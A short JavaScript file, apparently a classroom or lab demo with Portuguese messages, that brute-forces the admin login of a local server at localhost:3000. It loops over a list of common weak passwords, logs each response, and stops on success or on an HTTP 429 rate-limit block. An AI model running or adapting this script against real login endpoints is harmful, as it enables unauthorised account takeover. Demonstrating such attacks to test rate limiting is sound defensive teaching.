const passwordsToTry = [
  "0000",
  "1111",
  "123",
  "senha",
  "admin",
  "abcd",
  "4321",
  "1234"
];

async function bruteForce() {
  const username = "admin";

  console.log("Iniciando ataque de força bruta...\n");

  for (const password of passwordsToTry) {
    try {
      const response = await fetch("http://localhost:3000/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ username, password })
      });

      const data = await response.json();

      console.log(`Tentando senha: ${password}`);
      console.log(`Status HTTP: ${response.status}`);
      console.log("Resposta:", data);
      console.log("------------------------------------------------");

      if (data.success) {
        console.log(`Senha encontrada com sucesso: ${password}`);
        break;
      }

      if (response.status === 429) {
        console.log("Ataque interrompido por bloqueio de tentativas.");
        break;
      }
    } catch (error) {
      console.error("Erro durante o ataque:", error.message);
      break;
    }
  }
}

bruteForce();